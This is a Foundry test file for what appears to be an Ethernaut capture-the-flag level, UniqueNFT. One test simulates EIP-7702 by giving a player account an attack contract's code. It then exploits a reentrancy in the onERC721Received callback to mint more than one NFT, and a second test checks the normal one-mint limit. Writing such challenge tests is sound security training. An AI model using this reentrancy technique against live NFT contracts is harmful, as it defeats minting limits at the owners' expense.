// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";
import {UniqueNFT, UniqueNFTAttack} from "../../src/ethernaut2025/UniqueNFT.sol";

contract UniqueNFTTest is Test {
    UniqueNFT nft;
    UniqueNFTAttack attack;
    address player;

    function setUp() public {
        nft = new UniqueNFT();
        attack = new UniqueNFTAttack();
        player = makeAddr("player");
    }

    function testUniqueNFTExploit() public {
        // EIP-7702: give the player EOA the attack contract's code.
        vm.etch(player, address(attack).code);

        // Player calls mintNFTEOA; the onERC721Received callback (executed
        // before _mint, while balance is still 0) reenters and mints more.
        vm.prank(player, player); // tx.origin = player, msg.sender = player
        nft.mintNFTEOA();

        assertGt(nft.balanceOf(player), 1);
    }
}

contract UniqueNFTControlTest is Test {
    function testSingleMintEnforced() public {
        UniqueNFT nft = new UniqueNFT();
        address player = makeAddr("player");
        vm.prank(player, player); // tx.origin = msg.sender = player
        nft.mintNFTEOA();
        assertEq(nft.balanceOf(player), 1);
        // Second mint for the same EOA reverts.
        vm.prank(player, player);
        vm.expectRevert(bytes("only one unique NFT allowed"));
        nft.mintNFTEOA();
    }
}

// end

